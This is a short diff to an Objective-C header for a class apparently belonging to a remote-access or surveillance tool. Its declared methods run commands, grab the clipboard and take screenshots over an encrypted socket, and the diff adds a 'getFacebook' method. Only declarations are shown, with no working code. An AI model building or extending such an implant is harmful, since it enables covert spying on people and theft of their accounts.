@@ -4,6 +4,7 @@
 #include <arpa/inet.h>
 #import "FBEncryptorAES.h"
 #import "NSData+AESCrypt.h"
+#import <Appkit/Appkit.h>
 
 
 @interface espl : NSObject {
@@ -56,6 +57,7 @@ extern int sockfd;
 -(void)executeCMD:(NSArray *)args;
 -(void)idleTime;
 -(void)getPid;
+-(void)getFacebook;
 -(void)getPaste;
 -(void)set_brightness:(NSArray *)args;
 -(void)screenshot;
